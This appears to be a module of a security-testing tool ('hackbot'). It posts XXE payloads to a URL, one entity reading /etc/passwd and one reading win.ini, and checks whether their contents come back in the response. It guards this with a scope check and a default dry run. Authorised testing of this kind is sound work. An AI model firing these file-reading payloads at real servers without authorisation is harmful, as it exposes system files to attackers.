"""Capped XXE probe (XML body) — external entity canary only."""

from __future__ import annotations

import json
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

# File read canary (no OOB network required for signal)
_XXE_PASSWD = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
"""

_XXE_WIN = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
"""


def xxe_probe(
    target_dir: Path,
    url: str,
    *,
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
) -> RunnerResult:
    require_in_scope(target_dir, url, action="xxe xml external entity probe", force=force)
    plan = {"url": url, "bodies": 2, "approve": approve}
    ui.code_panel(json.dumps(plan, indent=2), title="xxe_probe", lexer="json")
    cmd = ["xxe_probe", url]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    results: list[dict[str, Any]] = []
    signal = False
    reason = "no XXE file marker"
    for label, body, markers in (
        ("passwd", _XXE_PASSWD, ("root:x:", "daemon:")),
        ("winini", _XXE_WIN, ("[fonts]", "[extensions]")),
    ):
        req = urllib.request.Request(
            url,
            data=body.encode("utf-8"),
            method="POST",
            headers={
                "User-Agent": "hackbot-xxe-probe",
                "Content-Type": "application/xml",
                "Accept": "*/*",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = int(getattr(resp, "status", None) or resp.getcode())
                text = resp.read(100_000).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            status = int(exc.code)
            text = exc.read(50_000).decode("utf-8", errors="replace") if exc.fp else ""
        except Exception as exc:  # noqa: BLE001
            results.append({"label": label, "error": f"{type(exc).__name__}: {exc}"})
            continue
        hit = any(m.lower() in text.lower() for m in markers)
        results.append(
            {
                "label": label,
                "status": status,
                "marker": hit,
                "preview": redact_text(text[:180]),
            }
        )
        if hit:
            signal = True
            reason = f"XXE file contents reflected ({label})"
            break

    out = {"url": url, "signal": signal, "reason": reason, "results": results}
    return RunnerResult(cmd, True, 0, json.dumps(out), "", "executed")
